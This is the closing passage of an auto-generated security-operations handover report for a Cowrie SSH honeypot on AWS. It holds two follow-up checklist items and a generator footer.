- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-23T20:57:55Z_
